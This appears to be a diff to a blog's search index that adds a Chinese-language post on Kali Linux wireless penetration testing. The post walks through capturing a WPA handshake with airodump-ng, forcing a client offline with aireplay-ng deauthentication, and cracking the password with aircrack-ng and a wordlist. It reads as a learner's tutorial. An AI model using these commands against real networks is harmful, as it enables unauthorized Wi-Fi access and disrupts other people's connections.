@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Kali Linux无线渗透初探]]></title>
+    <url>%2F2019%2F04%2F06%2FKali%20Linux%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2%2F</url>
+    <content type="text"><![CDATA[新购入无线网卡一枚，用于学习kali linux下的无线渗透内容。前期准备工作不多赘述，直接进入实操实战阶段。 ###启用无线网卡 1$ ifconfig wlan0 up ###开启网卡监听模式 1$ airmon-ng start wlan0 输入ifconfig命令查看网卡名称变为wlan0mon；输入iwconfig命令确认mode为monitor模式。 ###扫描附近wifi热点 1$ airodump-ng wlan0mon BSSID是路由器MAC地址，CH是无线信道。 ###对目标路由器进行抓包 1$ airodump-ng -c 1 --bssid ff:ff:ff:ff:ff:ff -w cap wlan0mon -c：信道–bssid：路由器MAC地址-w：指定抓到的包存放文件 此时可查看路由器接入的设备MAC地址，但是无法抓取设备发送到路由器的密码认证数据包，需要将目标设备踢下线自动重连，抓取认证握手包。 ###将目标设备踢下线 1$ aireplay-ng -0 10 -a ff:ff:ff:ff:ff:ff -c 00:00:00:00:00:00 wlan0mon -0：发送n条认证消息-a：路由器MAC地址-c：目标设备MAC地址 看到[WPA handshark:]代表成功抓取认证握手数据包。保存的文件目录中有cap-01.cap文件，通过爆破方式可解密认证密码。 ###密码爆破 1$ aircrack-ng cap-01.cap -w password.txt]]></content>
+      <categories>
+        <category>无线网络渗透</category>
+      </categories>
+      <tags>
+        <tag>无线渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[my_first_blog]]></title>
     <url>%2F2018%2F12%2F17%2Fmy-first-blog%2F</url>
     <content type="text"></content>
